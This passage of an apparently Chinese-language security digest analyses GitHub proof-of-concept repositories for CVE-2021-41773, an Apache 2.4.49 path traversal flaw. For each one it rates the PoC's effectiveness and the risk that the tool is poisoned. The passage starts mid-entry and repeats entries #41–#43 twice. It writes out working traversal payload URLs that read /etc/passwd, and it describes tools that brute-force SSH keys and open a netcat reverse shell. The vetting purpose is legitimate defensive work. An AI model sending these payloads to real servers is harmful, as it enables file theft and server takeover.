2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---



---

## POC #41

**来源**: [CVE-2021-41773-skentagon_CVE-2021-41773.md](../2021/CVE-2021-41773-skentagon_CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，且Alias配置的目录没有配置 "require all denied"，CGI scripts如果开启也可能导致远程代码执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773是Apache HTTP Server 2.4.49版本中存在的路径遍历漏洞。该漏洞源于Apache HTTP Server在处理URL路径时存在缺陷，允许攻击者通过构造包含`%2e`编码的`..`（点点斜杠）的恶意请求，绕过Alias配置的目录限制，访问服务器上的任意文件。如果目标服务器上Alias配置的目录没有配置 "require all denied"，且开启了CGI脚本执行功能，攻击者可以利用该漏洞读取敏感文件，甚至执行任意代码。

**有效性分析：**

提供的POC代码通过docker-compose搭建了包含漏洞的Apache HTTP Server 2.4.49环境，并提供了Python脚本来验证漏洞。`no-cgid/exploit.py`脚本构造了包含`%2e%2e`编码的路径遍历URL，尝试读取`/etc/passwd`文件。从代码结构来看，该POC能够有效验证漏洞的存在，实现任意文件读取。

**投毒风险分析：**

分析仓库中的代码，可以得出以下结论：

*   **`README.md`：** 描述了漏洞信息和POC的使用方法，未发现恶意代码。
*   **`docker-compose.yml`：** 定义了Docker容器的配置，用于搭建漏洞环境，未发现恶意代码。
*   **`no-cgid/Dockerfile`：** 使用httpd:2.4.49镜像，并拷贝了`httpd.conf`文件，未发现恶意代码。
*   **`no-cgid/exploit.py`：** 用于验证漏洞的Python脚本，功能是发送包含路径遍历的HTTP请求，未发现恶意代码。
*   **`no-cgid/httpd.conf`：** Apache的配置文件，没有配置 "require all denied"，未发现恶意代码。

综合来看，仓库中主要包含漏洞环境搭建和验证代码，**但仍然存在一定的投毒风险，约为10%**。可能的投毒方式包括：

1.  在`httpd.conf`中插入恶意配置，例如开启不安全的功能或设置错误的权限，导致其他安全问题。
2.  在`exploit.py`中添加恶意代码，例如在成功利用漏洞后执行其他操作，例如反弹shell等。
3. 镜像来源存在风险，Docker Hub上的镜像可能被篡改。虽然使用了官方的 `httpd:2.4.49`镜像，但依旧存在潜在的风险。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含`%2e%2e`编码的路径遍历URL，例如`/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`，尝试读取服务器上的任意文件。
2.  **信息泄露：** 如果路径遍历成功，攻击者可以读取敏感配置文件、源代码等信息，进一步了解系统架构和安全策略。
3.  **远程代码执行 (如果CGI启用)：** 如果服务器启用了CGI，攻击者可以利用路径遍历上传恶意脚本，并通过CGI执行，从而获取服务器的控制权。
4.  **权限绕过：** 如果Alias配置不当，攻击者可能绕过访问控制，访问受保护的资源。

**项目地址:** [skentagon/CVE-2021-41773](https://github.com/skentagon/CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #42

**来源**: [CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md](../2021/CVE-2021-41773-tiemio_SSH-key-and-RCE-PoC-for-CVE-2021-41773.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal and RCE

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49，并开启了CGI脚本支持，且Alias配置不当或存在默认配置漏洞。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 中。由于路径规范化存在缺陷，未经身份验证的攻击者可以利用路径遍历漏洞读取服务器上的任意文件，甚至执行远程代码。根据漏洞库信息和搜索引擎结果，此漏洞已在野外被利用。

**利用方式：**

1.  **路径遍历：** 攻击者可以使用包含 `/.%2e` 序列的 URL 绕过路径限制，访问受限目录之外的文件。例如：`http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd` 可以尝试读取 `/etc/passwd` 文件。
2.  **远程代码执行：** 如果启用了 CGI 脚本，并且可以通过路径遍历访问到 CGI 脚本目录之外的文件，攻击者可以通过上传恶意 CGI 脚本并执行它来实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码是一个 Go 语言编写的工具，用于利用 CVE-2021-41773 进行攻击。该工具支持以下功能：

*   指定目标 IP 地址和端口。
*   选择 SSH 密钥字典的大小（小、中、大）。
*   启用 HTTPS。
*   指定自定义 SSH 密钥字典。
*   启用远程代码执行。

该 POC 的主要攻击流程如下：

1.  从目标服务器的 `/etc/passwd` 文件中提取用户名。
2.  使用指定的 SSH 密钥字典尝试暴力破解 SSH 密钥。
3.  （如果启用了 RCE）执行远程代码。

**投毒风险分析：**

经过对 POC 代码的分析，发现潜在的投毒风险较低，约为5%。主要原因如下：

*   该 POC 代码主要实现了路径遍历读取文件和 SSH 密钥爆破功能，本身不包含明显的恶意代码。
*   代码结构较为清晰，方便审查。
*   可以通过限制用户权限来降低风险，避免用户直接编译执行。

**潜在投毒点：**

*   如果攻击者替换了默认的 SSH 密钥字典，可能会导致爆破失败或者植入恶意 SSH 密钥。
*   在 RCE 功能中，攻击者可以执行任意命令，可能存在安全风险。

**总体评估：**

该 POC 代码的有效性较高，可以用于验证 CVE-2021-41773 漏洞，并进行简单的 SSH 密钥爆破。投毒风险较低，但仍然需要保持警惕，避免使用来源不明的字典文件，并限制 RCE 功能的使用。

**项目地址:** [tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773](https://github.com/tiemio/SSH-key-and-RCE-PoC-for-CVE-2021-41773)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

## POC #43

**来源**: [CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md](../2021/CVE-2021-41773-wangfly-me_Apache_Penetration_Tool.md)

## CVE-2021-41773 - Apache HTTP Server Path Traversal

**漏洞编号:** CVE-2021-41773

**漏洞类型:** 路径遍历 (Path Traversal)

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49

**利用条件:** 需要目标服务器运行存在漏洞的 Apache HTTP Server 2.4.49，并且Alias配置不当，或者CGI脚本未禁用

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-41773 存在于 Apache HTTP Server 2.4.49 版本中。该漏洞是由于路径规范化中的一个缺陷引起的，允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置的目录之外的文件。如果这些目录之外的文件没有受到 'require all denied' 的默认配置保护，请求就可以成功。如果 CGI 脚本也为这些别名路径启用，则可能允许远程代码执行。

**有效性：**

根据漏洞库信息和搜索引擎结果，该漏洞已在野外被利用，表明提供的漏洞利用代码（QT C++开发的利用工具）可能有效。搜索结果中的多个链接确认了该漏洞的存在，利用方式以及高危风险。

**投毒风险：**

提供的漏洞利用代码是 QT C++ 开发的工具的 README 文件，描述了工具的界面和使用方法，包括漏洞检测、目录遍历、命令执行和反弹 shell 功能。虽然 README 本身没有直接包含恶意代码，但工具的完整代码（未提供）可能存在作者隐藏的后门或恶意功能。因为无法验证工具全部代码，所以认为有10%的投毒风险，主要体现在工具可能搜集目标信息，或在特定情况下执行恶意操作。

**利用方式：**

利用方式主要包括：

1.  **路径遍历：** 攻击者通过构造包含 '..' 的特殊 URL，绕过服务器的路径检查，访问受限目录之外的文件。
2.  **信息泄露：** 如果成功进行路径遍历，攻击者可以读取服务器上的敏感文件，例如配置文件、源代码等。
3.  **远程代码执行：** 如果服务器启用了 CGI 脚本，并且攻击者能够通过路径遍历访问 CGI 脚本，则可以执行任意命令。
4.  **反弹Shell：** 工具描述中包含通过 netcat (nc) 开启监听，然后执行反弹 shell 的操作，允许远程控制目标服务器。

**项目地址:** [wangfly-me/Apache_Penetration_Tool](https://github.com/wangfly-me/Apache_Penetration_Tool)

**漏洞详情:** [CVE-2021-41773](https://nvd.nist.gov/vuln/detail/CVE-2021-41773)

---

